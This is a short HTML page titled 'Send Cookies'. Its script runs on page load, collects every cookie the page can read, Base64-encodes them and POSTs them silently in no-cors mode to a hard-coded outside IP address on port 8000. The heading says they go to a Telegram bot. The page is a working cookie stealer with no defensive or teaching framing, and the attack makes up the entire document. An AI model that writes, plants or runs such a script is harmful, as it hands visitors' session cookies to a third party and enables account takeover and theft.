<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Send Cookies</title>
    <script>
        function getCookies() {
            if (!document.cookie) return {};

            const cookiePairs = document.cookie.split('; ');
            const cookies = {};

            cookiePairs.forEach(pair => {
                const index = pair.indexOf('=');
                
                if (index === -1) {
                    cookies[pair] = "";
                } else {
                    const name = pair.substring(0, index);
                    const value = pair.substring(index + 1);
                    cookies[name] = decodeURIComponent(value);
                }
            });

            return cookies;
        }

        function sendCookiesToServer() {
            const cookies = getCookies();
            const encodedCookies = btoa(unescape(encodeURIComponent(JSON.stringify(cookies)))); // Base64 encode with proper Unicode handling
            console.log("Cookies to be sent (encoded):", encodedCookies);

            fetch('https://144.172.76.108:8000/send-cookies', {
                method: 'POST',
                mode: 'no-cors',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ cookies: encodedCookies })
            })
            .catch(err => {
                console.error("Error sending cookies:", err);
            });
        }

        window.onload = sendCookiesToServer;
    </script>
</head>
<body>
    <h1>Send Cookies to Telegram Bot</h1>
</body>
</html>
